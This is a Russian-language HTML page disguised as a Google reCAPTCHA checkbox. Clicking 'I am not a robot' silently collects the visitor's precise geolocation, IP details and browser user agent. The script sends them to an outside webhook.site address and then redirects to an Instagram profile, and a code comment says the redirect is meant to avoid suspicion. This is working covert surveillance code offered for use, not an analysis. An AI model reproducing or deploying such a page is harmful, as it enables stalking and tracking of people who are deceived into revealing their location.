<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение действия</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .captcha-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .rc-anchor { display: flex; align-items: center; justify-content: space-between; height: 74px; }
        .rc-content { display: flex; align-items: center; }
        .checkbox-wrapper { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; position: relative; background: #fff; }
        .checkbox-wrapper.active::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 12px; border: solid #4285f4; border-width: 0 3px 3px 0; transform: rotate(45deg); }
        .rc-text { font-size: 14px; color: #555; font-family: 'Roboto', arial; }
        .rc-logo { text-align: center; }
        .rc-logo img { width: 32px; display: block; margin: 0 auto; }
        .rc-logo span { font-size: 8px; color: #555; }
        #loader { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; }
    </style>
</head>
<body>

<div class="captcha-card">
    <div class="rc-anchor">
        <div class="rc-content">
            <div class="checkbox-wrapper" id="captcha-cb"></div>
            <div class="rc-text">Я не робот</div>
        </div>
        <div class="rc-logo">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span>reCAPTCHA</span>
            <div style="font-size:7px;">Конфиденциальность</div>
        </div>
    </div>
    <div id="loader">Обработка данных безопасности...</div>
</div>

<script>
    const webhook = 'https://webhook.site/675c487a-3093-4826-9eb8-dd9f5ed15c0d';

    document.getElementById('captcha-cb').onclick = function() {
        const cb = this;
        cb.style.borderColor = '#4285f4';
        document.getElementById('loader').style.display = 'block';

        // 1. Сбор ГЕОПОЗИЦИИ (Основная цель)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                cb.classList.add('active');
                sendData({
                    event: 'GEO_SUCCESS',
                    coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    map_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                    accuracy: pos.coords.accuracy + ' meters'
                });
                finish();
            }, (err) => {
                sendData({ event: 'GEO_DENIED', error: err.message });
                finish();
            }, { enableHighAccuracy: true });
        } else {
            finish();
        }

        // 2. Сбор IP и инфо об устройстве в фоне
        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
            sendData({ event: 'IP_INFO', data: data, agent: navigator.userAgent });
        });
    };

    function sendData(data) {
        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
    }

    function finish() {
        setTimeout(() => {
            // Редирект на тот самый инстаграм, чтобы не было подозрений
            window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ==";
        }, 1500);
    }
</script>

</body>
</html>
